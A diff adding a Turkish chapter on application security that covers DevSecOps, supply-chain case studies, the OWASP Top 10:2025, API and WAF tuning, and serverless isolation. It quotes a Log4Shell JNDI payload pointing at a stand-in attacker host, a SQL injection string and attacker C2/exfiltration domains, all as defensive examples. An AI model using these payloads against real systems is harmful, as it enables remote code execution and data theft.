@@ -1,0 +1,333 @@
+# BÖLÜM 10: UYGULAMA GÜVENLİĞİ (APPLICATION SECURITY)
+
+*Savunma Derinliği (Defense-in-Depth) Teknik Doküman Serisi*
+
+## Giriş ve Mimari Konumlandırma
+
+Savunma derinliği mimarisinde uygulama katmanı; ağ perimetresi (firewall, IPS), kimlik katmanı ve veri katmanının "en içteki" halkasıdır. Ağ kontrolleri (Palo Alto / Fortinet NGFW, segmentasyon) atlatıldığında saldırgan ile veri arasındaki son savunma hattı uygulamanın kendisidir. CIS Controls v8'in Kontrol 16'sı (Application Software Security) bunu net ifade eder: "Saldırgan, ağ ve sistem güvenlik kontrollerini atlatmaya çalışan ayrıntılı bir saldırı zinciri yerine, veriyi ele geçirmek için doğrudan uygulamanın kendisini kullanabilir." Bu bölüm üç ana eksende uygulama güvenliğini ele alır: güvenli yazılım geliştirme yaşam döngüsü ve DevSecOps; web/API güvenliği ve WAF; serverless mimari ve V8 isolate güvenliği — her birini Türkiye'ye özgü yasal yükümlülüklerle ve uluslararası standart eşlemeleriyle birlikte.
+
+---
+
+## TL;DR
+
+- **OWASP Top 10:2025 (Kasım 2025) iki yeni risk getirdi:** A03 Software Supply Chain Failures (eski "Vulnerable Components"ın genişlemesi, en yüksek exploit skoru) ve A10 Mishandling of Exceptional Conditions; SSRF artık A01 Broken Access Control altında. Uygulama güvenliği, SolarWinds/Log4Shell/XZ Utils/Shai-Hulud'un kanıtladığı gibi "shift-left" + tedarik zinciri savunmasını zorunlu kılar.
+- **Mimari olarak savunma katmanlanmalıdır:** SDLC'de tehdit modelleme (STRIDE/PASTA) + SAST/DAST/IAST + SBOM (Syft/Grype/Dependency-Track) + SLSA provenance imzalama; çalışma-anında WAF (ModSecurity CRS anomaly scoring/paranoia levels) + API Gateway (BOLA savunması, JWT/mTLS, katmanlı rate limiting). V8 isolate'leri Firecracker microVM'lerden zayıf yalıtım sunar; Spectre savunması için Cloudflare timer-kilitleme + Dynamic Process Isolation kullanır.
+- **Türkiye'de loglama hem teknik hem yasaldır:** 5651 (≥1 yıl + zaman damgası), KVKK (m.5/2-ç hukuki yükümlülük, veri minimizasyonu/maskeleme), BDDK (≥3 yıl), TCMB (≥10 yıl), SPK (≥5 yıl). Merkezi SIEM + NTP senkronizasyonu + 5070'e dayalı zaman damgası zorunludur.
+
+---
+
+## 10.1. Güvenli Yazılım Geliştirme (SDLC), Kod Analizi (SAST/DAST) ve DevSecOps
+
+### 10.1.1. "Shift-Left" Güvenlik ve Tehdit Modelleme
+
+Geleneksel SDLC'de güvenlik testleri sürümlemenin sonunda yapılırdı; "Shift-Left" yaklaşımı güvenlik aktivitelerini tasarım ve kodlama aşamalarına çeker. Bunun ekonomik gerekçesi nettir: bir kusurun düzeltme maliyeti yaşam döngüsünde ilerledikçe katlanarak artar. Sık alıntılanan IBM Systems Sciences Institute verisine göre üretimde/bakım aşamasında bulunan bir kusurun düzeltilmesi, tasarım aşamasında bulunana göre yaklaşık 100 kata kadar pahalı olabilir (implementasyonda ~6x, test/QA'da ~15x). *Not: bu çalışmanın birincil kaynağı bazı analistlerce tartışmalı bulunduğundan rakamlar büyüklük mertebesi olarak yorumlanmalıdır; ancak "erken yakala, ucuza düzelt" ilkesi sektörce kabul görmüştür.*
+
+NIST SP 800-218 (SSDF v1.1, Şubat 2022) bu felsefeyi dört uygulama grubuna ayırır: **PO (Prepare the Organization), PS (Protect the Software), PW (Produce Well-Secured Software), RV (Respond to Vulnerabilities)** — toplam 19 pratik ve 42 görev. SSDF, ABD Başkanlık Kararnamesi EO 14028'e yanıt olarak geliştirilmiştir ve federal yazılım tedarikçileri için OMB M-22-18 (Eylül 2022) ile zorunlu hale getirilmiştir. Aralık 2025'te SSDF v1.2 taslağı (SP 800-218 Rev.1 ipd) yayımlanmıştır.
+
+**Tehdit modelleme**, tasarım aşamasının kalbidir. İki temel metodoloji:
+
+- **STRIDE**: Microsoft'ta 1999'da Loren Kohnfelder ve Praerit Garg tarafından geliştirilen, model-merkezli (model-centric) bir yaklaşım. Altı tehdit kategorisi: **S**poofing (kimlik sahteciliği), **T**ampering (kurcalama), **R**epudiation (inkar), **I**nformation Disclosure (bilgi ifşası), **D**enial of Service (hizmet reddi), **E**levation of Privilege (yetki yükseltme). Veri Akış Diyagramı (DFD) üzerindeki her bileşene/güven sınırına STRIDE uygulanır. Genellikle DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability) ile birlikte risk skorlaması için kullanılır.
+- **PASTA** (Process for Attack Simulation and Threat Analysis): Yedi aşamalı, risk-merkezli (risk-centric) ve saldırgan odaklı bir metodoloji. İş hedefleri ile teknik gereksinimleri birleştirir; kapsam tanımlama, tehdit numaralandırma, zafiyet analizi, saldırı simülasyonu ve skorlama içerir. STRIDE'a göre daha derin ve iş bağlamına oturur.
+
+**Microsoft Threat Modeling Tool** (eski SDL Threat Modeling Tool), DFD tabanlı ve STRIDE sınıflandırmasını otomatik uygulayan ücretsiz bir araçtır. IriusRisk gibi araçlar ise SDLC boyunca "yaşayan tehdit modeli" tutar ve OWASP ZAP gibi araçlarla otomasyon sağlar.
+
+**Örnek senaryo — mikroservis DFD'si:** Ödeme API'sine giden bir veri akışında güven sınırı (trust boundary) internet ile API Gateway arasındadır. STRIDE uygulandığında: *Spoofing* → zayıf JWT doğrulaması; *Tampering* → istek gövdesinin değiştirilmesi; *Information Disclosure* → fazla veri ifşası; *Elevation of Privilege* → BFLA ile admin endpoint'ine erişim. Her tehdit, bir mitigasyon (mTLS, imza doğrulama, alan-seviyesi yetkilendirme, rol kontrolü) ile eşlenir ve PW.1 (SSDF) gereği gereksinim olarak kayıt altına alınır.
+
+### 10.1.2. SAST, DAST ve IAST — Mekanizmalar ve Pipeline Konumu
+
+| Boyut | SAST | DAST | IAST |
+|---|---|---|---|
+| Yaklaşım | Statik kaynak kodu analizi | Çalışan uygulamaya dış saldırı (kara kutu) | Çalışan uygulama içine enstrümantasyon |
+| Çalışma anı | Kod yazımı / PR | Staging / sürüm öncesi | Fonksiyonel/QA testleri sırasında |
+| Çalışan uygulama gerekir mi? | Hayır | Evet | Evet |
+| Yanlış pozitif (FP) | Yüksek (bağlam yokluğu) | Düşük | Çok düşük (çalışma-anı doğrulaması) |
+| Tipik kör nokta | Çalışma-anı yapılandırma, erişim kontrolü, ortam-özgü auth | Test edilmeyen kod yolları | Yalnızca testlerin tetiklediği yollar |
+| Araçlar | SonarQube, Semgrep, Checkmarx, GitHub Advanced Security (CodeQL), Veracode | OWASP ZAP, Burp Suite, Snyk API & Web | Contrast Security |
+
+**Saldırgan ve savunma dengesi:** SAST, kaynak kodda çalışma-anı bağlamı olmadan çalıştığı için OWASP'ın da açıkça belirttiği gibi yüksek yanlış pozitif üretir; tetiklenmeyen bir kod yolu çalışma-anında "exploit edilemez" olduğunda gürültü yaratır. DAST ise saldırganın bakış açısını taklit eder (kara kutu), gerçek exploit edilebilir kusurları bulur ama test edilmeyen yolları ve kaynak-seviyesi mantığı kaçırır. IAST ikisini birleştirir: çalışan uygulamanın içinden SAST gibi kod görür, DAST gibi çalışma-anı bağlamına sahiptir; bu nedenle yanlış pozitifi neredeyse sıfırdır ama yalnızca testlerin tetiklediği kod yollarını kapsar.
+
+NIST SSDF, kod analizini (PW.7 — statik analiz dâhil) ve çalıştırılabilir kod testini (PW.8 — dinamik analiz/fuzz testi) tamamlayıcı pratikler olarak ele alır. Pratikte iyi çalışan varsayılan entegrasyon: **her PR'da SAST; staging'de DAST (zamanlanmış + sürüm tetikli); test kapsamının iyi olduğu yerlerde IAST; yalnızca seçili üretim servislerinde — performans testi ve geri-alma planıyla — RASP.** Semgrep, 4.000+ kuralını OWASP Top 10:2025 eşlemesine güncellemiştir; örneğin OS Command Injection kuralı `A05:2025 - Injection` ile etiketlenir.
+
+### 10.1.3. Yazılım Tedarik Zinciri Güvenliği, SCA ve SBOM
+
+OWASP Top 10:2025'te (Kasım 2025, Washington DC Global AppSec'te yayımlandı) en çarpıcı yapısal değişiklik, 2021'deki "A06 Vulnerable and Outdated Components" kategorisinin **A03:2025 - Software Supply Chain Failures** olarak genişletilmesidir. Topluluk anketinde katılımcıların %50'si bunu birincil endişe olarak işaretledi (tüm kategoriler içinde en yüksek konsensüs). Veride en yüksek ortalama exploit/impact skoruna ve en yüksek görülme oranına (%5,19) sahiptir; buna karşın yalnızca 11 CVE eşlenir — çünkü tedarik zinciri saldırıları "koddaki hatalar" değil "süreçlerdeki güven ihlalleridir".
+
+**SBOM (Software Bill of Materials)**, yazılımın "içindekiler listesidir". İki ana format:
+- **CycloneDX**: OWASP kökenli, güvenlik odaklı; native `purl` (package URL) tanımlayıcıları NVD/OSV/GitHub Advisory ile doğrudan eşleşir. 1.5+ sürümü VEX, formulation ve makine-okunur servis bağımlılıkları ekledi; 1.6 ise CBOM (Cryptography Bill of Materials) getirdi.
+- **SPDX**: Linux Foundation tarafından geliştirilen, lisans/uyum denetimleri için doğal seçim; en eski formattır (SPDX 2.3).
+
+**Araç zinciri (open source):**
+- **Syft** (Anchore): konteyner imajları ve dosya sistemlerinden SBOM üretir (CycloneDX/SPDX/Syft-JSON). `--scope all-layers` ile çok-aşamalı build girdilerini denetler.
+- **Grype** (Anchore): SBOM'u girdi alıp NVD/OSV/ekosistem danışmanlıklarına karşı zafiyet eşler.
+- **Trivy**: hem tarama hem SBOM üretimi.
+- **OWASP Dependency-Track** (4.11+): SBOM'ları kalıcı veritabanına alır ve yeni zafiyetler yayımlandıkça sürekli yeniden değerlendirir.
+- **Cosign / Sigstore / in-toto**: SBOM ve artifaktı imzalayarak/attest ederek sahteciliği önler.
+- **VEX (Vulnerability Exploitability eXchange)**: "bu CVE ürünümüzü gerçekten etkiliyor mu?" sorusunu standart biçimde yanıtlayarak yanlış pozitifleri bastırır.
+
+`syft <imaj> -o cyclonedx-json` ve `grype sbom:./my-sbom.cdx.json` komutları temel akıştır. CISA KEV (Known Exploited Vulnerabilities) kataloğu önceliklendirmede en üst sinyaldir.
+
+**Vaka çalışmaları (saldırgan mantığı + Blue-Team savunması):**
+
+1. **SolarWinds / SUNBURST (Aralık 2020):** Saldırganlar (FireEye'ın UNC2452, Microsoft'un Solorigate dediği aktör) kaynak kod deposunu DEĞİL, otomatik **build sistemini** ele geçirdi. SUNSPOT adlı enjektör (`taskhostsvc.exe`, dahili adı `taskhostw.exe`, build tarihi ~2020-02-20), `MsBuild.exe` sürecini saniyede bir izleyerek Orion derlenirken kaynağı değiştirdi ve SUNBURST'ü ekledi. İmzalama sistemi güvenilmez kodu imzaladı; trojanlı güncellemeler Mart-Haziran 2020 arasında `avsvmcloud[.]com` C2 altyapısıyla dağıtıldı. **Önemli düzeltme:** Yaklaşık 18.000 müşteri trojanlı Orion sürümünü indirdi, ANCAK SolarWinds CEO'su Sudhakar Ramakrishna'nın resmi açıklamasına göre SUNBURST üzerinden fiilen ele geçirilen müşteri sayısı 100'den azdı ("fewer than 100") — "18.000 ele geçirildi" yaygın bir medya hatasıdır. **Savunma dersi:** build ortamı bütünlüğü, SLSA provenance, imza doğrulaması, üç ayrı/heterojen build ortamı.
+
+2. **Log4Shell / CVE-2021-44228 (Aralık 2021, CVSS 10.0):** Log4j'nin JNDI lookup özelliği kötüye kullanıldı. `${jndi:ldap://attacker.com/a}` gibi bir dize loglandığında uygulama saldırgan kontrolündeki LDAP sunucusuna bağlanıp kötü amaçlı Java sınıfı yükledi → RCE. Açık 2013'ten beri sessizce vardı; Alibaba'dan Chen Zhaojun 24 Kasım 2021'de bildirdi. **Etki ölçeği:** IBM'e göre keşif anında tüm dijital varlıkların tahminen %10'u savunmasızdı; Wiz/EY araştırması kurumsal bulut ortamlarının %93'ünün etkilendiğini gösterdi; Tenable CEO'su Amit Yoran bunu "şimdiye kadarki en büyük, en kritik zafiyet" olarak nitelendirdi. **SOC/Blue-team tespiti:** loglarda `${jndi:}` dizesi (ldap/ldaps/rmi protokolleriyle), 389/636/1389 portlarına anormal giden bağlantılar. Splunk tstats ile RFC1918 dışı LDAP bağlantıları, Suricata IDS imzaları (`2021-44228`) ile DNS callback'leri avlanır. Yama: 2.16.0 (Message Lookups kaldırıldı, JNDI varsayılan kapalı), 2.17.0 (DoS — CVE-2021-45105).
+
+3. **XZ Utils / CVE-2024-3094 (Mart 2024, CVSS 10.0):** "Jia Tan" (JiaT75) takma adlı bir aktör, 2021'den başlayarak neredeyse iki yıl boyunca güven inşa edip maintainer oldu ve liblzma'ya gizli bir SSH backdoor'u (5.6.0/5.6.1 sürümleri) yerleştirdi. Backdoor, build sürecinde gizli test dosyalarından obfuscated payload çıkarıp SSHD'nin RSA doğrulamasını değiştiriyordu (yalnızca saldırganın özel anahtarıyla pre-auth RCE). Microsoft mühendisi/PostgreSQL geliştiricisi Andres Freund, SSH oturum açmalarındaki ~500ms gecikme ve anormal CPU kullanımını araştırırken 29 Mart 2024'te openwall oss-security listesine bildirerek keşfetti. Devlet-destekli aktör olduğu değerlendiriliyor. **Savunma dersi:** maintainer güven modeli, build-time davranış analizi, Debian/Fedora rolling sürümlerde sürüm sabitleme.
+
+4. **Shai-Hulud npm solucanı (Eylül 2025 → "2.0/The Second Coming" Kasım 2025):** Kendini çoğaltan (self-replicating) ilk büyük npm solucanı; `@ctrl/tinycolor` ile başladı. V2, `postinstall` yerine **`preinstall`** aşamasında çalışarak (başarısız kurulumlar dahil) etki alanını genişletti, Node.js yerine Bun runtime'ı (`setup_bun.js` dropper, `bun_environment.js` payload) kullandı. TruffleHog ile sır taradı, bulut metadata uçlarını sorguladı, çalınan sırları `Shai-Hulud` adlı public GitHub depolarına yükledi ("Sha1-Hulud: The Second Coming" açıklamasıyla). **Ölçek (Zscaler ThreatLabz):** "Within hours of its initial detection, the campaign had compromised over 700 npm packages, created more than 27,000 malicious GitHub repositories, and exposed approximately 14,000 secrets across 487 organizations." Datadog ve JFrog ikinci dalgada toplam ~796 benzersiz paket (>20M haftalık indirme) belirledi. **Savunma:** `npm ci` + lockfile (package-lock.json/pnpm-lock.yaml) sıkı zorlaması, scoped/kısa-ömürlü token, preinstall script denetimi, özel registry proxy/SCA, `webhook[.]site` exfiltrasyon domaininin bloklanması. Red Hat, sürüm sabitleme (version pinning) sayesinde etkilenmediğini belirtti.
+
+### 10.1.4. CI/CD Pipeline'a Güvenlik Otomasyonu Entegrasyonu
+
+**SLSA (Supply-chain Levels for Software Artifacts)** çerçevesi, build çıktısının belirli bir kaynak commit'ine ve build ortamına izlenebilirliğini sağlar. SLSA Level 3, çoğu ekip için pratik hedeftir: provenance, kontrol etmediğiniz bir build servisi (GitHub Actions) tarafından üretilir, Sigstore keyless altyapısıyla imzalanır. GitHub Actions OIDC token üretir; bu token Fulcio CA'dan kısa-ömürlü sertifika almak için kullanılır ve imza Rekor şeffaflık loguna kaydedilir. `slsa-github-generator`, BYOB (Build Your Own Builder) çerçevesiyle provenance üretimini kullanıcı build mantığından izole ederek L3 ayrımını sağlar — build job imza anahtarına erişemez. **SLSA, SBOM DEĞİLDİR ve koddaki kötü niyetli ekleri tespit etmez;** yalnızca artifaktın kökenini kanıtlar.
+
+**Gating stratejisi:** Pipeline'da güvenlik kapıları (gates) şu eşiklerle kurulur — Critical/High CVE bulunursa build başarısız; SBOM üretimi başarısız olursa build durur; imzalanmamış artifakt reddedilir.
+
+Örnek GitHub Actions YAML (SBOM + imzalama):
+```yaml
+name: Build and SBOM
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write   # OIDC token için (Fulcio sertifikası)
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        run: ./gradlew assemble
+      - name: Generate SBOM (CycloneDX)
+        run: syft packages dir:./build/libs -o cyclonedx-json > sbom.json
+      - name: Scan SBOM (fail on High/Critical)
+        run: grype sbom:./sbom.json --fail-on high
+      - name: Sign artifact & SBOM
+        run: |
+          cosign sign --key ${{ secrets.COSIGN_KEY }} my-registry/my-app:${{ github.sha }}
+          cosign sign-blob --key ${{ secrets.COSIGN_KEY }} \
+            --output-signature sbom.json.sig sbom.json
+```
+
+GitLab CI ve Jenkins'te de benzer mantık geçerlidir: SAST/DAST/Dependency-Scanning aşamaları, `allow_failure: false` ile bloklayıcı kapı olur. GitLab Ultimate; Advanced SAST, IaC tarama (Terraform/Helm/Dockerfile), Secret Detection ve Dependency Scanning'i tek platformda sunar ve OWASP Top 10:2025 A03'ü doğrudan kapsar.
+
+**Mimari diyagram (tarif):** Soldan sağa akan bir DevSecOps boru hattı — *Developer IDE (SAST/Semgrep eklentisi) → Git Commit (pre-commit secret tarama) → CI Build (Syft SBOM + Grype + SAST) → Artifact Registry (Cosign imza + SLSA provenance attestation) → Staging Deploy (DAST/OWASP ZAP) → Production (RASP + WAF + runtime izleme)*. Her aşamada bir "güvenlik kapısı" simgesi ve başarısızlıkta geliştiriciye giden bir geri-besleme oku; sağda SIEM'e akan log oku.
+
+---
+
+## 10.2. Web Uygulaması ve API Güvenliği (OWASP Top 10 / WAF)
+
+### 10.2.1. Güncel OWASP Top 10:2025
+
+OWASP Top 10:2025, 175.000'den fazla CVE kaydı ve 589 CWE analiziyle (8. sürüm) 2021'den bu yana ilk büyük güncellemedir. İki yeni kategori ve bir konsolidasyon getirir:
+
+1. **A01:2025 - Broken Access Control** — #1'de kalır; test edilen uygulamaların ortalama %3,73'ünde 40 CWE'den biri bulunur. **SSRF bu kategoriye dahil edildi.** API odaklı BOLA ve BFLA yetkilendirme kusurlarını açıkça kapsar (mikroservis/bulut çağında servis-seviyesi ile kullanıcı-seviyesi erişim arasındaki çizginin bulanıklaşması).
+2. **A02:2025 - Security Misconfiguration** — #5'ten #2'ye yükseldi (%3,00); sürekli dağıtımın sürekli taramayla eşleşmemesi yapısal kanıt.
+3. **A03:2025 - Software Supply Chain Failures** — YENİ kapsam (eski A06'nın genişlemesi); en yüksek exploit/impact skoru, %5,19 görülme oranı.
+4. **A04:2025 - Cryptographic Failures** — #2'den #4'e indi (%3,80).
+5. **A05:2025 - Injection** — #3'ten #5'e indi; XSS bu kategoride. En çok test edilen, en çok CVE'li kategori (38 CWE).
+6. **A06:2025 - Insecure Design** — #4'ten #6'ya (tehdit modelleme yaygınlaştığı için iyileşme gözlendi).
+7. **A07:2025 - Authentication Failures** — #7 (isim değişikliği; standart auth çerçevelerinin yaygınlaşması olumlu etki yaptı).
+8. **A08:2025 - Software or Data Integrity Failures** — #8 (artifakt/veri bütünlüğü, imzasız güncellemeler, insecure deserialization).
+9. **A09:2025 - Security Logging & Alerting Failures** — #9; "alerting" vurgusu eklendi (alarmsız loglama görünürlük ve müdahale için değersizdir).
+10. **A10:2025 - Mishandling of Exceptional Conditions** — YENİ (24 CWE); hatalı hata yönetimi, mantık hataları, "fail open", verbose hata mesajlarıyla bilgi ifşası.
+
+**Injection — saldırgan + savunma:** SQL injection (`' OR 1=1--`) düşük frekanslı/yüksek etkili; XSS yüksek frekanslı/düşük etkili. Saldırgan mantığı: kullanıcı girdisinin sorgu/komut bağlamına kaçırılması. Savunma (Blue-Team): parametreli sorgular (prepared statements), çıktı kodlama, allowlist doğrulama; WAF imzası (libinjection ile `@detectSQLi`).
+
+### 10.2.2. REST ve GraphQL API Güvenliği — OWASP API Security Top 10 (2023)
+
+OWASP API Security Top 10, web listesinden ayrı bir projedir (2019, 2023'te güncellendi). API1:2023 **BOLA (Broken Object Level Authorization)**, 2019'dan beri #1; API pentestlerinde en sık bulgu ve otomatik tarayıcıların büyük kısmının göremediği bir kusurdur. Salt Security'nin "State of API Security" raporuna göre BOLA tüm API saldırılarının yaklaşık %40'ında temsil edilir ve en yaygın API güvenlik tehdididir; Wallarm API ThreatStats Q2 2025 raporu da API ile ilgili Known Exploited Vulnerabilities'lerin çoğunun BOLA istismarı olduğunu gösterir. 2023 güncellemesindeki diğer önemli değişiklikler: SSRF kendi slotunu aldı (API7:2023), Unsafe Consumption of APIs (API10:2023) eklendi, BOPLA (Broken Object Property Level Authorization, API3) Excessive Data Exposure + Mass Assignment'ı birleştirdi.
+
+**Kimlik doğrulama mekanizmaları:**
+- **OAuth2 / JWT**: JWT doğrulamada kritik kusurlar — algoritma karışıklığı (`alg:none`, HS256↔RS256 confusion), zayıf imza anahtarı, claim kurcalama, eksik audience (`aud`) doğrulaması. Gateway her istekte imza/expiry/issuer/audience doğrulamalı.
+- **mTLS**: makine-makine ve partner entegrasyonlarında çift yönlü kimlik doğrulama.
+- **Rate Limiting**: katmanlı (global, API başına, istemci başına, endpoint başına); 429 + `Retry-After` header.
+
+**GraphQL'e özgü riskler:**
+- **Introspection abuse**: Introspection açık bırakıldığında saldırgan tüm şemayı (tipler, alanlar, ilişkiler) öğrenir. Üretimde kapatılmalı; staging'de açık unutulmamalı (saldırgan, neredeyse aynı API'yi çalıştıran public staging ortamından şemayı elde edebilir).
+- **Query depth/complexity attacks**: derin iç içe sorgular muazzam DB yükü üretir (DoS). Sorgu derinliği ve karmaşıklık limitleri (query cost analysis) zorunlu.
+- **Batching attacks**: sorgu toplu işleme (batching) rate-limit'i atlatabilir; brute-force/credential stuffing'i hızlandırır (login mutation'ı 2 deneme/dakika ile sınırlı olsa bile batching ile aşılabilir).
+- **Nested IDOR / BOLA**: resolver'lar her erişim noktasında sahiplik (ownership) doğrulamalı; `order(id:"1002")` gibi bir manipülasyon başka müşterinin işlem geçmişini döndürmemeli. Yetkilendirme tek bir endpoint seviyesinde değil, her obje/alan/mutasyon seviyesinde uygulanmalı.
+
+**Blue-Team savunma:** OPA/Cerbos/Casbin gibi merkezi policy engine'leri ile fonksiyon-seviyesi yetkilendirme (BFLA savunması); başarısız yetkilendirme denemelerinin loglanması ve anomali tespiti; BOLA testi için iki test hesabı yöntemi (Hesap A'nın kaynağına Hesap B'nin token'ıyla erişim denemesi).
+
+### 10.2.3. WAF Mimari Konumlandırma ve Kural Ayarlama
+
+**Topolojide WAF konumu:** WAF, internet ile uygulama arasında ters proxy olarak konumlanır. Tipik kurumsal akış: *İnternet → CDN/DDoS (Cloudflare/AWS Shield) → WAF → API Gateway/Load Balancer → uygulama*. AWS'de WAF, API Gateway'de diğer tüm erişim kontrollerinden (resource policy, IAM, Lambda authorizer, Cognito) ÖNCE değerlendirilir — "ilk savunma hattı". WAF bir CIDR bloğunu bloklarsa, resource policy izin verse bile WAF önceliklidir ve resource policy değerlendirilmez.
+
+**ModSecurity + OWASP Core Rule Set (CRS) — Anomaly Scoring ve Paranoia Levels:**
+
+CRS, doğrudan bloklama yerine **anomaly scoring** kullanır: birden çok kural eşleşmesi puan biriktirir, eşik aşılınca bloklar. Her kritik kural ~5 puan, daha az ciddi kurallar 2-3 puan ekler. Dört **Paranoia Level (PL)** vardır: PL1 (geniş uyumlu, dost) → PL4 (çok katı). Yüksek PL daha çok saldırı yakalar ama daha çok yanlış pozitif üretir.
+
+Örnek `crs-setup.conf` parametreleri:
+```
+# Bloklama eşiği (gelen/giden istekler için)
+SecAction "id:900110,phase:1,pass,nolog,\
+  setvar:tx.inbound_anomaly_score_threshold=5,\
+  setvar:tx.outbound_anomaly_score_threshold=4"
+# Paranoia Level (varsayılan 1)
+SecAction "id:900000,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=1"
+# Executing/Detection PL > Blocking PL: yüksek PL kurallarını çalıştır
+# ama skorlama/bloklama dışı tut
+SecAction "id:900001,phase:1,nolog,pass,t:none,setvar:tx.executing_paranoia_level=2"
+```
+
+**Folini Method (iteratif yanlış pozitif ayarlama):** Yeni kurulumda eşiği yüksek (örn. 10.000) başlat, kimseyi bloklamadan yanlış alarmları topla, kural istisnaları (rule exclusions) yazarak temizle, ardından eşiği kademeli 5'e indir. **Executing/Detection Paranoia Level**, yüksek PL kurallarını üretimde çalıştırıp skorlamaya saymadan yanlış pozitifleri tespit etmeyi sağlar; ayarlama bitince Blocking PL yükseltilir. Tipik yanlış pozitif örnekleri: `942450 SQL Hex Encoding` (session cookie'lerdeki `0x` deseni), `921180 HTTP Parameter Pollution` (aynı parametrenin `ids[]` ile tekrarı).
+
+Örnek SQLi tespit kuralı (CRS 942100, libinjection):
+```
+SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \
+ "@detectSQLi" \
+ "id:942100,phase:2,block,capture,t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls,\
+  msg:'SQL Injection Attack Detected via libinjection',\
+  tag:'attack-sqli',tag:'paranoia-level/1',tag:'OWASP_TOP_10/A1',severity:'CRITICAL',\
+  setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
+  setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+```
+
+**Cloudflare WAF / AWS WAF:** Cloudflare yönetilen kurallar + özel ifadeler sunar. AWS WAF'ta rate-based rule örneği (CDK/CloudFormation):
+```yaml
+Name: RateLimitPerIP
+Priority: 1
+Action: { Block: {} }
+Statement:
+  RateBasedStatement:
+    Limit: 2000          # 5 dakikalık kayan pencerede IP başına max istek
+    AggregateKeyType: IP
+```
+Kimlik doğrulama uçları için daha sıkı (örn. 100/5dk) ikinci bir kural eklenir. **Yanlış pozitif azaltma:** JSON API'lerde özel karakterler SQLi/XSS kurallarını tetikleyebilir → hedefli rule exclusion. **Önemli sınır:** WAF'ın per-token rate limiting'i (Authorization header ile) güvenilir değildir — token süresi dolup yenilenince saldırgan/kullanıcı yeni bir aggregation bucket'a düşer; gerçek per-user limit için custom Lambda/Redis tabanlı çözüm gerekir.
+
+**Örnek WAF log çıktısı (kavramsal):**
+```
+[2026-06-20 10:14:22] [client 203.0.113.45] ModSecurity: Access denied with code 403.
+  Matched "Operator `DetectSQLi' ... [id "942100"]
+  [msg "SQL Injection Attack Detected via libinjection"]
+  [severity "CRITICAL"] [tag "attack-sqli"] [uri "/api/v1/users"]
+  [data "Matched Data: ' OR 1=1-- found within ARGS:id"]
+  Inbound Anomaly Score Exceeded (Total: 5)
+```
+
+---
+
+## 10.3. Sunucusuz (Serverless) Mimari ve V8 Isolate Güvenliği
+
+### 10.3.1. V8 Isolate Güvenlik Modeli vs. Konteyner/microVM
+
+**V8 isolate (Cloudflare Workers):** Bir isolate, Google Chrome'da kullanılan V8 JavaScript motorunun bir örneğidir. Tek bir runtime, yüzlerce/binlerce isolate çalıştırabilir; her isolate'in belleği yalıtılmıştır. Konteynerlerin aksine her fonksiyon için VM oluşturmak yerine, isolate mevcut bir ortamda oluşturulur — bu, **0ms'ye yakın cold start** ve global dağıtım sağlar. Cloudflare'ın açıklamasıyla: "In Cloudflare Workers, we isolate tenants from each other using V8 isolates — not processes nor VMs." (Kasım 2025'te tanıtılan Dynamic Workers, isolate başlatmayı konteynerlerden ~100x hızlı ve 10-100x daha bellek-verimli yapar.)
+
+**Kritik mimari fark:** V8 isolate'leri **OS-seviyesi konteyner DEĞİLDİR**; binlerce tenant tek bir OS sürecini ve çekirdeği paylaşır. **AWS Lambda ise Firecracker microVM** kullanır: her fonksiyon, KVM hipervizör/donanım sınırında, kendi misafir çekirdeğine (guest kernel) sahip izole bir microVM'de çalışır; Jailer bileşeni chroot/seccomp/cgroups/namespaces ile ek hapis sağlar. AWS'nin ifadesiyle her fonksiyon "its own kernel" ile çalışır, böylece "no shared kernel vulnerabilities can cross function boundaries." Firecracker microVM ~5 MiB bellek tüketir ve ~125ms'de başlar.
+
+Güvenlik sınırı hiyerarşisi:
+**microVM (bağımsız çekirdek, KVM/donanım yalıtımı) > konteyner (paylaşılan çekirdek, namespace yalıtımı) > V8 isolate (paylaşılan süreç, yazılım/dil-seviyesi yalıtım)**.
+
+Cloudflare bunu açıkça kabul eder: izolate-tabanlı sandbox'ı sıkılaştırmak donanım VM'lerine göre daha zordur ve V8 güvenlik hataları hipervizör açıklarından daha sıktır.
+
+**Cloudflare'ın katmanlı savunması:**
+- V8 güvenlik yamalarının üretime saatler içinde (Chrome'dan bile hızlı) otomatik dağıtımı.
+- **Cordoning (bölmeleme):** Worker'lara güven seviyesi atanır; düşük güvenli Worker'lar yüksek güvenlilerden ayrı süreçlere yerleştirilir (Free plan müşterisi Enterprise ile aynı süreçte çalışmaz) — V8 zero-day'ine karşı defense-in-depth.
+- **Layer-2 sandbox:** Linux namespaces + seccomp ile dosya sistemi ve ağ erişimi tamamen engellenir (konteyner motorlarından daha katı yapılandırmayla).
+- Kötü amaçlı kod desenleri için tarama ve otomatik ek sandboxing.
+
+### 10.3.2. Cold Start ve Bellek Yalıtımı Zafiyetleri
+
+**Warm container / state leakage:** Cold start maliyetini azaltmak için sağlayıcılar **warm container** (sıcak konteyner) kullanır — aynı yürütme ortamı birden çok çağrı için yeniden kullanılır (Lambda 15-60 dk sıcak tutar). Bu performans avantajı güvenlik garantilerini zayıflatır: warm container'lar dosya sistemini sıfırlasa da, çağrılar arası durum paylaşımı için yazılabilir bir `/tmp/` alanı bırakır. Bir fonksiyonu ele geçiren saldırgan, `/tmp/` içindeki verinin çağrılar arası kaldığı gerçeğinden yararlanarak alarm üretmeyen uzun-ömürlü saldırılar yürütebilir. Akademik literatür bunu detaylandırır:
+- **"Serverless Computing: A Security Perspective"** (arXiv 2107.03832): warm container `/tmp/` üzerinden kalıcı saldırıları tanımlar.
+- **"Valve: Securing Function Workflows on Serverless Computing Platforms"** (Datta vd., WWW 2020): saldırganların warm container yeniden kullanım politikasını "oyunlayarak" çağrılar arası kalıcı ele geçirilmiş kopya önbelleğe alabildiğini gösterir.
